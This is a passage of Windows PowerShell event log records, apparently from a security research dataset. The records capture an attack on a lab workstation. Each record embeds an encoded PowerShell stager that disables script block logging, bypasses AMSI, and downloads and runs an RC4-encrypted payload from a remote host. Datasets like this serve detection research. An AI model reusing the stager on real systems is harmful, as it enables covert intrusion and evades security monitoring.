AbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=0fd2189f-3371-4502-9a40-5e8afb4bf73d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=        $IV=[BitConverter]::GetBytes($(Get-Random));\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Random): \"Get-Random\"\r\n","Opcode":"Info","SourceName":"PowerShell","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","ThreadID":0,"RecordNumber":3419,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":36028797018963968,"Severity":"INFO","host":"wec.internal.cloudapp.net","EventID":800,"port":53971,"@version":"1","Category":"Pipeline Execution Details","EventReceivedTime":"2020-09-04 03:29:47","Task":8,"EventTime":"2020-09-04 03:29:46","Channel":"Windows PowerShell","@timestamp":"2020-09-04T07:29:47.607Z","SourceModuleType":"im_msvistalog","ExecutionProcessID":0,"tags":["mordorDataset"]}
{"Message":"Pipeline execution details for command line:             0..255 | ForEach-Object {\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=2\r\n\r\n\tSequenceNumber=2997\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=5e60cc9d-d63a-4599-90d3-47e5ecc63e1b\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=0fd2189f-3371-4502-9a40-5e8afb4bf73d\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            0..255 | ForEach-Object {\n \r\n\r\nDetails: \r\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"\n                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;\n                $S[$_], $S[$J] = $S[$J], $S[$_];\n            \"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"0\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"1\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"2\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"3\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"4\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"5\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"6\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"7\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"8\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"9\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"10\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"11\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"12\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"13\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"14\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"15\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"16\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"17\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"18\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"19\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"20\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"21\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"22\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"23\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"24\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"25\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"26\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"27\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"28\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"29\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"30\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"31\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"32\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"33\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"34\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"35\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"36\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"37\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"38\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"39\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"40\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"41\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"42\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"43\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"44\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"45\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"46\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"47\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"48\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"49\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"50\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"51\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"52\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"53\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"54\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"55\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"56\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"57\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"58\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"59\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"60\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"61\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"62\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"63\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"64\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"65\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"66\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"67\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"68\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"69\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"70\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"71\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"72\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"73\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"74\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"75\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"76\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"77\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"78\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"79\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"80\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"81\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"82\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"83\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"84\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"85\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"86\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"87\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"88\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"89\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"90\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"91\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"92\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"93\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"94\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"95\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"96\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"97\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"98\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"99\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"100\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"101\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"102\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"103\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"104\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"105\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"106\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"107\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"108\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"109\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"110\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"111\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"112\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"113\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"114\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"115\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"116\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"117\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"118\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"119\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"120\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"121\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"122\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"123\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"124\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"125\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"126\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"127\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"128\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"129\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"130\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"131\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"132\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"133\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"134\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"135\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"136\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"137\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"138\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"139\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"140\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"141\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"142\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"143\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"144\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"145\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"146\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"147\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"148\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"149\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"150\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"151\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"152\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"153\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"154\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"155\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"156\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"157\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"158\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"159\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"160\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"161\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"162\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"163\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"164\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"165\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"166\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"167\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"168\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"169\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"170\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"171\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"172\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"173\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"174\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"175\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"176\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"177\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"178\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"179\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"180\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"181\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"182\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"183\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"184\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"185\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"186\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"187\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"188\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"189\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"190\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"191\"\r\nParameterBinding(ForEach-Object): name=\"InputObject\"; 